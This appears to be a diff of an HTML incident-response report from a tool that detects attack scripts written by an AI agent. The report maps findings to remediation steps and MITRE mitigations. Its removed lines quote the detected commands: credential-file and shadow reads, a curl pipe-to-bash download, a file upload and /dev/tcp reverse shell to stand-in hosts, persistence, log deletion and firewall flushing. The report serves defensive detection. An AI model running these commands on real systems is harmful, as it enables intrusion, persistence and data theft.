-<div class="pair"><span class="label"></span><span class="value">ClusterSecretRead: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">hash of deploy: $6$fixturesalt$fixturehashvalue0123456789abcdef</span></div>
+<div class="pair"><span class="label"></span><span class="value">password of app_rw: Fixture-Pass-01</span></div>
+<div class="pair"><span class="label"></span><span class="value">token: fixture-token-0123456789</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Persistence established</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>A way back in was created: a credential, an account, a key, a scheduled job, a service or a start-up entry. Access survives a password reset.</p>
-<div class="pair"><span class="label">targets</span><span class="value">runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ScheduledJobCreation: (crontab -l; echo &#34;$JOB&#34;) | crontab - (20261022_091500_step04_persist.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">AccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">AccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)</span></div>
-<div class="pair"><span class="label"></span><span class="value">and 2 more in report.json</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Data collected</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Mail, chat, documents or files were gathered in bulk. Treat their content as disclosed.</p>
-<div class="pair"><span class="label">targets</span><span class="value">archive out.tgz</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">gzip: gzip {} (20261022_092500_step06_stage.sh:7)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ArchiveCreation, Collection tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Data may have left the environment</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>A transfer out was run. Confirm what was sent and where.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url https://files.example.net/up; file out.tgz</span></div>
-<div class="pair"><span class="label">what</span><span class="value">FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)</span></div>
-<div class="pair"><span class="label"></span><span class="value">nc: nc -zv 203.0.113.41 443 (20261022_093000_step07_channel.py:7)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">FileUpload, Exfiltration tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Outside hosts contacted</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Files or commands were fetched from, or a channel was opened to, hosts outside the environment. Affected: 198.51.100.7, 203.0.113.40, 203.0.113.41.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh; host 203.0.113.41 ($H); port $PORT</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ShellDownloadAndExecute: sudo bash -c &#34;$(curl -fsSL http://203.0.113.40/s.sh)&#34; (20261022_092500_step06_stage.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: os.system(&#34;exec 3&lt;&gt;/dev/tcp/$H/$PORT&#34;) (20261022_093000_step07_channel.py:8)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ShellDownloadAndExecute, ReverseShell</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Movement to other systems</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Tools that reach other systems were run. Hosts beyond this one may be affected.</p>
-<div class="pair"><span class="label">what</span><span class="value">ssh: ssh ops@198.51.100.7 &#39;cat /etc/hostname&#39; (20261022_092500_step06_stage.sh:6)</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: ops</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">LateralMovement tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Defences and logging impaired</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Logs were cleared or security tooling was interfered with. Records of this period are incomplete.</p>
-<div class="pair"><span class="label">targets</span><span class="value">log /var/log/auth.log; setting HISTFILE; service auditd</span></div>
-<div class="pair"><span class="label">what</span><span class="value">LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">HistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)</span></div>
-<div class="pair"><span class="label"></span><span class="value">FirewallDisabling: iptables -F (20261022_092000_step05_evade.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">FirewallDisabling: iptables -F (audit_20261022_093500.jsonl)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">LogDeletion, HistoryDisabling, SecurityToolDisabling, FirewallDisabling, DefenseImpairment tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Code run outside normal controls</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Code was run in ways that avoid application control and leave little on disk.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ShellDownloadAndExecute: sudo bash -c &#34;$(curl -fsSL http://203.0.113.40/s.sh)&#34; (20261022_092500_step06_stage.sh:4)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ShellDownloadAndExecute</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Traces hidden</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Files or history were removed or disguised. What is left on the host is incomplete.</p>
-<div class="pair"><span class="label">targets</span><span class="value">file $F</span></div>
-<div class="pair"><span class="label">what</span><span class="value">HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">Timestomp: touch -r /bin/ls &#34;$F&#34; (20261022_092000_step05_evade.sh:8)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">HistoryClearing, Timestomp</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark low">[i]</td><td class="cell">Commands generated by an AI agent</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>The scripts were written by an AI agent, which is the premise of this tool. Generated commands differ from run to run, so a detection that matches exact text misses them.</p>
 <div class="pair"><span class="label">basis</span><span class="value">the premise of the tool</span></div>
-<div class="pair"><span class="label">files</span><span class="value">20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 5 more</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark low">[i]</td><td class="cell">Environment mapped</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Identities, resources or configuration were listed. Later steps were probably aimed with the result.</p>
-<div class="pair"><span class="label">targets</span><span class="value">searched /; service sshd; username alerts@corp.example; username app_rw; username daemon; username deploy; username root; username svc; email alerts@corp.example; device build01.corp.internal; device db01.corp.internal; ip 10.20.30.5; and 1 more</span></div>
-<div class="pair"><span class="label">what</span><span class="value">SetuidFileSearch: find / -perm -4000 -type f 2&gt;/dev/null &gt; suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ServiceDiscovery: systemctl status sshd (20261022_090000_step01_recon.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">id: id (20261022_090000_step01_recon.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">uname: uname -a (20261022_090000_step01_recon.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">kubectl: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">docker: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">and 3 more in report.json</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: app_rw</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: daemon</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: deploy</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: root</span></div>
+<div class="pair"><span class="label"></span><span class="value">email: alerts@corp.example</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip</span></div>
 </div></td></tr>
 </tbody>
@@ -833,102 +752,61 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Revoke sessions and reset identities</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Revoke the sessions and tokens of every identity in the evidence and reset its credentials.</p>
-<div class="pair"><span class="label">what</span><span class="value">ssh: ssh ops@198.51.100.7 &#39;cat /etc/hostname&#39; (20261022_092500_step06_stage.sh:6)</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: ops</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">LateralMovement tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Rotate what was read</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.</p>
-<div class="pair"><span class="label">targets</span><span class="value">file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fixture-token-0123456789</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ShadowFileRead: sudo cat /etc/shadow &gt; shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">CloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ &gt; meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ClusterSecretRead: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">hash of deploy: $6$fixturesalt$fixturehashvalue0123456789abcdef</span></div>
+<div class="pair"><span class="label"></span><span class="value">password of app_rw: Fixture-Pass-01</span></div>
+<div class="pair"><span class="label"></span><span class="value">token: fixture-token-0123456789</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Remove persistence</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Delete the scheduled jobs, services, accounts, keys and start-up entries that were created, and the files they start.</p>
-<div class="pair"><span class="label">targets</span><span class="value">runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ScheduledJobCreation: (crontab -l; echo &#34;$JOB&#34;) | crontab - (20261022_091500_step04_persist.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">AccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">AccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)</span></div>
-<div class="pair"><span class="label"></span><span class="value">and 2 more in report.json</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Undo privilege changes on hosts</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Put sudo rules, file modes and container settings back to their approved state, and treat the host as held at root until rebuilt.</p>
-<div class="pair"><span class="label">targets</span><span class="value">file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host</span></div>
-<div class="pair"><span class="label">what</span><span class="value">SudoersModification: echo &#34;$RULE&#34; &gt;&gt; /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SetuidBit: chmod u&#43;s &#34;$F&#34; (20261022_091000_step03_privesc.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">SudoersModification, SetuidBit, ContainerEscape</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Restore security tooling</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Turn the stopped security services, audit rules and firewall back on, and confirm that each reports again.</p>
-<div class="pair"><span class="label">targets</span><span class="value">service auditd</span></div>
-<div class="pair"><span class="label">what</span><span class="value">SecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)</span></div>
-<div class="pair"><span class="label"></span><span class="value">FirewallDisabling: iptables -F (20261022_092000_step05_evade.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">FirewallDisabling: iptables -F (audit_20261022_093500.jsonl)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">SecurityToolDisabling, FirewallDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Block and hunt the infrastructure</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Block the addresses and domains in the findings, and search proxy, DNS and firewall logs for other hosts that reached them.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H); port $PORT</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ShellDownloadAndExecute: sudo bash -c &#34;$(curl -fsSL http://203.0.113.40/s.sh)&#34; (20261022_092500_step06_stage.sh:4)</span></div>
-<div class="pair"><span class="label"></span><span class="value">FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: os.system(&#34;exec 3&lt;&gt;/dev/tcp/$H/$PORT&#34;) (20261022_093000_step07_channel.py:8)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ShellDownloadAndExecute, FileUpload, ReverseShell</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Scope the data taken</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Establish from audit logs which mailboxes, chats, sites and files were read or sent out, and assess that data as breached.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url https://files.example.net/up; file out.tgz; archive out.tgz</span></div>
-<div class="pair"><span class="label">what</span><span class="value">FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">gzip: gzip {} (20261022_092500_step06_stage.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">nc: nc -zv 203.0.113.41 443 (20261022_093000_step07_channel.py:7)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">FileUpload, ArchiveCreation, Collection tools, Exfiltration tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Find the delivered files</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Collect the files that were downloaded, dropped or loaded, hash them, and search every host for the same hashes.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label">what</span><span class="value">ShellDownloadAndExecute: sudo bash -c &#34;$(curl -fsSL http://203.0.113.40/s.sh)&#34; (20261022_092500_step06_stage.sh:4)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ShellDownloadAndExecute</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Recover the missing logs</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Treat local logs as incomplete, and recover the period from a central collector or a backup.</p>
-<div class="pair"><span class="label">targets</span><span class="value">log /var/log/auth.log; setting HISTFILE; file $F</span></div>
-<div class="pair"><span class="label">what</span><span class="value">LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">HistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">Timestomp: touch -r /bin/ls &#34;$F&#34; (20261022_092000_step05_evade.sh:8)</span></div>
-<div class="pair"><span class="label"></span><span class="value">iptables: iptables -F (20261022_092000_step05_evade.sh:5)</span></div>
-<div class="pair"><span class="label"></span><span class="value">iptables: iptables -F (audit_20261022_093500.jsonl)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">LogDeletion, HistoryClearing, HistoryDisabling, Timestomp, DefenseImpairment tools</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark low">[i]</td><td class="cell">Follow what was enumerated</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Use what was listed to predict targets: check those identities, vaults and hosts for later activity.</p>
-<div class="pair"><span class="label">targets</span><span class="value">searched /; service sshd; username alerts@corp.example; username app_rw; username daemon; username deploy; username root; username svc; email alerts@corp.example; device build01.corp.internal; device db01.corp.internal; ip 10.20.30.5; and 1 more</span></div>
-<div class="pair"><span class="label">what</span><span class="value">SetuidFileSearch: find / -perm -4000 -type f 2&gt;/dev/null &gt; suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)</span></div>
-<div class="pair"><span class="label"></span><span class="value">ServiceDiscovery: systemctl status sshd (20261022_090000_step01_recon.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">id: id (20261022_090000_step01_recon.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">uname: uname -a (20261022_090000_step01_recon.sh:3)</span></div>
-<div class="pair"><span class="label"></span><span class="value">kubectl: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)</span></div>
-<div class="pair"><span class="label"></span><span class="value">docker: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)</span></div>
-<div class="pair"><span class="label"></span><span class="value">and 3 more in report.json</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: app_rw</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: daemon</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: deploy</span></div>
+<div class="pair"><span class="label"></span><span class="value">username: root</span></div>
+<div class="pair"><span class="label"></span><span class="value">email: alerts@corp.example</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip</span></div>
 </div></td></tr>
 </tbody>
@@ -945,180 +823,140 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1017 User Training</td><td class="cell">T1552.001</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>User Training involves educating employees and contractors on recognizing, reporting, and preventing cyber threats that rely on human interaction, such as phishing, social engineering, and other manipulative techniques.</p>
-<div class="pair"><span class="label">for</span><span class="value">CredentialFileRead: file ~/.aws/credentials</span></div>
+<div class="pair"><span class="label">for</span><span class="value">CredentialFileRead</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1018 User Account Management</td><td class="cell">T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.</p>
-<div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
-<div class="pair"><span class="label"></span><span class="value">SshKeyPersistence: file ~/.ssh/authorized_keys</span></div>
-<div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: unit sync.service</span></div>
-<div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: service auditd</span></div>
+<div class="pair"><span class="label">for</span><span class="value">FileUpload, ScheduledJobCreation, SshKeyPersistence, SystemdUnitCreation, ClusterSecretRead, SecurityToolDisabling, FirewallDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1022 Restrict File and Directory Permissions</td><td class="cell">T1048, T1053.006, T1070.003, T1098.004, T1543.002, T1546.004, T1548.003, T1552.001, T1552.004, T1685, T1685.006, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Restricting file and directory permissions involves setting access controls at the file system level to limit which users, groups, or processes can read, write, or execute files.</p>
-<div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
-<div class="pair"><span class="label"></span><span class="value">SshKeyPersistence: file ~/.ssh/authorized_keys</span></div>
-<div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: unit sync.service</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellProfilePersistence: file ~/.bashrc, adds $LINE</span></div>
-<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc, rule $RULE</span></div>
-<div class="pair"><span class="label"></span><span class="value">and 4 more in report.json</span></div>
+<div class="pair"><span class="label">for</span><span class="value">FileUpload, ScheduledJobCreation, HistoryClearing, SshKeyPersistence, SystemdUnitCreation, ShellProfilePersistence, SudoersModification, CredentialFileRead, PrivateKeyRead, SecurityToolDisabling, LogDeletion, FirewallDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1024 Restrict Registry Permissions</td><td class="cell">T1685, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Restricting registry permissions involves configuring access control settings for sensitive registry keys and hives to ensure that only authorized users or processes can make modifications.</p>
-<div class="pair"><span class="label">for</span><span class="value">SecurityToolDisabling: service auditd</span></div>
+<div class="pair"><span class="label">for</span><span class="value">SecurityToolDisabling, FirewallDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1026 Privileged Account Management</td><td class="cell">T1003.008, T1053.002, T1053.006, T1136.001, T1543.002, T1548.003, T1552.007, T1611</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Privileged Account Management focuses on implementing policies, controls, and tools to securely manage privileged accounts (e.g., SYSTEM, root, or administrative accounts).</p>
-<div class="pair"><span class="label">for</span><span class="value">ShadowFileRead: file /etc/shadow</span></div>
-<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
-<div class="pair"><span class="label"></span><span class="value">AccountCreation: account svc</span></div>
-<div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: unit sync.service</span></div>
-<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc, rule $RULE</span></div>
-<div class="pair"><span class="label"></span><span class="value">ContainerEscape: mount /:/host</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShadowFileRead, ScheduledJobCreation, AccountCreation, SystemdUnitCreation, SudoersModification, ClusterSecretRead, ContainerEscape</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1027 Password Policies</td><td class="cell">T1003.008, T1552.001, T1552.004</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Set and enforce secure password policies for accounts to reduce the likelihood of unauthorized access.</p>
-<div class="pair"><span class="label">for</span><span class="value">ShadowFileRead: file /etc/shadow</span></div>
-<div class="pair"><span class="label"></span><span class="value">CredentialFileRead: file ~/.aws/credentials</span></div>
-<div class="pair"><span class="label"></span><span class="value">PrivateKeyRead: file ~/.ssh/id_rsa</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShadowFileRead, CredentialFileRead, PrivateKeyRead</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1028 Operating System Configuration</td><td class="cell">T1053.002, T1548.001, T1548.003, T1552.003, T1690</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.</p>
-<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
-<div class="pair"><span class="label"></span><span class="value">SetuidBit: file /tmp/tool ($F)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc, rule $RULE</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellHistoryRead: file ~/.bash_history</span></div>
-<div class="pair"><span class="label"></span><span class="value">HistoryDisabling: setting HISTFILE</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1029 Remote Data Storage</td><td class="cell">T1070.003, T1685.006</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Remote Data Storage focuses on moving critical data, such as security logs and sensitive files, to secure, off-host locations to minimize unauthorized access, tampering, or destruction by adversaries.</p>
-<div class="pair"><span class="label">for</span><span class="value">LogDeletion: log /var/log/auth.log</span></div>
+<div class="pair"><span class="label">for</span><span class="value">HistoryClearing, LogDeletion</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1030 Network Segmentation</td><td class="cell">T1048, T1095, T1552.007</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Network segmentation involves dividing a network into smaller, isolated segments to control and limit the flow of traffic between devices, systems, and applications.</p>
-<div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
+<div class="pair"><span class="label">for</span><span class="value">FileUpload, ReverseShell, ClusterSecretRead</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1031 Network Intrusion Prevention</td><td class="cell">T1048, T1095, T1105</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Use intrusion detection signatures to block traffic at network boundaries.</p>
-<div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
+<div class="pair"><span class="label">for</span><span class="value">FileUpload, ReverseShell, ShellDownloadAndExecute</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1032 Multi-factor Authentication</td><td class="cell">T1136.001</td></tr>
